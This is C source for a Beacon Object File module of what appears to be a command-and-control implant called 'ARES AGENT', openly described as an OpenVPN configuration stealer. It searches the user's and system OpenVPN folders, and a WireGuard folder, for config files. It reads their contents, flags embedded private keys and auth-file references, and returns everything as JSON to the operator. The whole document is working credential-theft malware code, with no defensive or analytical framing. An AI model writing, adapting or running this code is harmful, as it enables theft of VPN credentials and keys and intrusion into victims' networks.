/*
 * ═══════════════════════════════════════════════════════════════
 *  ARES AGENT — BOF Module: OpenVPN Configuration Stealer
 *
 *  Steals OpenVPN .ovpn config files containing:
 *    - Remote server addresses
 *    - Embedded certificates and private keys
 *    - Auth credentials (auth-user-pass files)
 *
 *  Search locations:
 *    - %USERPROFILE%\OpenVPN\config\
 *    - %APPDATA%\OpenVPN\config\
 *    - C:\Program Files\OpenVPN\config\
 *    - C:\Program Files (x86)\OpenVPN\config\
 *
 *  Output: JSON with config file contents
 * ═══════════════════════════════════════════════════════════════
 */

#include <windows.h>
#include <stdio.h>
#include <string.h>

extern void BeaconPrintf(int type, const char* fmt, ...);
extern void BeaconOutput(int type, const char* data, int len);

/* ── Read file into heap ── */
static char* _read_file(const char* path, DWORD* out_sz) {
    HANDLE hf = CreateFileA(path, GENERIC_READ,
        FILE_SHARE_READ|FILE_SHARE_WRITE|FILE_SHARE_DELETE,
        NULL, OPEN_EXISTING, 0, NULL);
    if (hf == INVALID_HANDLE_VALUE) return NULL;
    DWORD sz = GetFileSize(hf, NULL);
    if (sz == 0 || sz > 2*1024*1024) { CloseHandle(hf); return NULL; }
    char* buf = (char*)HeapAlloc(GetProcessHeap(), 0, sz + 1);
    if (!buf) { CloseHandle(hf); return NULL; }
    DWORD rd; ReadFile(hf, buf, sz, &rd, NULL);
    CloseHandle(hf);
    buf[rd] = '\0';
    *out_sz = rd;
    return buf;
}

/* ── JSON-escape a string ── */
static int json_escape(const char* src, int src_len, char* dst, int dst_max) {
    int o = 0;
    for (int i = 0; i < src_len && o < dst_max - 2; i++) {
        char c = src[i];
        if (c == '"' || c == '\\') { dst[o++] = '\\'; dst[o++] = c; }
        else if (c == '\n') { dst[o++] = '\\'; dst[o++] = 'n'; }
        else if (c == '\r') { /* skip */ }
        else if (c == '\t') { dst[o++] = '\\'; dst[o++] = 't'; }
        else if (c >= 32) { dst[o++] = c; }
    }
    dst[o] = '\0';
    return o;
}

/* ── Extract "remote" line from ovpn config ── */
static int extract_remote(const char* cfg, char* out, int max) {
    char* r = strstr(cfg, "remote ");
    if (!r) return 0;
    r += 7;
    int i = 0;
    while (*r && *r != '\n' && *r != '\r' && i < max - 1) out[i++] = *r++;
    out[i] = '\0';
    return i;
}

/* ── Scan directory for .ovpn files ── */
static int scan_dir(const char* dir, char* json, int json_off, int json_max, int* count) {
    int off = json_off;
    char pattern[MAX_PATH];
    snprintf(pattern, MAX_PATH, "%s\\*.ovpn", dir);

    WIN32_FIND_DATAA fd;
    HANDLE hFind = FindFirstFileA(pattern, &fd);
    if (hFind == INVALID_HANDLE_VALUE) return off;

    do {
        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) continue;

        char filepath[MAX_PATH + 256];
        snprintf(filepath, sizeof(filepath), "%s\\%s", dir, fd.cFileName);

        DWORD sz = 0;
        char* content = _read_file(filepath, &sz);
        if (!content) continue;

        /* Extract key fields */
        char remote[256] = {0};
        extract_remote(content, remote, sizeof(remote));

        /* Check for embedded keys/certs */
        int has_key = (strstr(content, "-----BEGIN") != NULL);
        int has_auth = (strstr(content, "auth-user-pass") != NULL);

        /* JSON-escape the full config (truncate if too large) */
        int cfg_len = (int)sz;
        if (cfg_len > 4096) cfg_len = 4096; /* cap per config */
        char escaped[8192];
        json_escape(content, cfg_len, escaped, sizeof(escaped));

        if (*count > 0 && off < json_max - 2) json[off++] = ',';
        off += snprintf(json + off, json_max - off,
            "{\"file\":\"%s\",\"remote\":\"%s\","
            "\"has_embedded_keys\":%s,\"has_auth_file\":%s,"
            "\"config\":\"%s\"}",
            fd.cFileName, remote,
            has_key ? "true" : "false",
            has_auth ? "true" : "false",
            escaped);
        (*count)++;

        memset(content, 0, sz);
        HeapFree(GetProcessHeap(), 0, content);

    } while (FindNextFileA(hFind, &fd) && off < json_max - 1024);

    FindClose(hFind);
    return off;
}

/* ═══════════════════════════════════════════════════════
 *  BOF ENTRY POINT
 * ═══════════════════════════════════════════════════════ */
void go(char* args, int args_len)
{
    (void)args; (void)args_len;

    char userprofile[MAX_PATH], appdata[MAX_PATH];
    GetEnvironmentVariableA("USERPROFILE", userprofile, MAX_PATH);
    GetEnvironmentVariableA("APPDATA", appdata, MAX_PATH);

    char json[65536];
    int off = 0;
    int count = 0;
    off += snprintf(json + off, sizeof(json) - off,
        "{\"type\":\"vpn_configs\",\"source\":\"OpenVPN\",\"configs\":[");

    /* Scan all known OpenVPN config directories */
    char dir[MAX_PATH + 64];

    snprintf(dir, sizeof(dir), "%s\\OpenVPN\\config", userprofile);
    off = scan_dir(dir, json, off, sizeof(json), &count);

    snprintf(dir, sizeof(dir), "%s\\OpenVPN\\config", appdata);
    off = scan_dir(dir, json, off, sizeof(json), &count);

    snprintf(dir, sizeof(dir), "C:\\Program Files\\OpenVPN\\config");
    off = scan_dir(dir, json, off, sizeof(json), &count);

    snprintf(dir, sizeof(dir), "C:\\Program Files (x86)\\OpenVPN\\config");
    off = scan_dir(dir, json, off, sizeof(json), &count);

    /* Also check for WireGuard configs */
    snprintf(dir, sizeof(dir), "C:\\Program Files\\WireGuard\\Data\\Configurations");
    off = scan_dir(dir, json, off, sizeof(json), &count);

    off += snprintf(json + off, sizeof(json) - off, "],\"total\":%d}", count);

    BeaconOutput(0, json, off);
    BeaconPrintf(0, "\n[+] VPN config steal complete: %d configs", count);
}
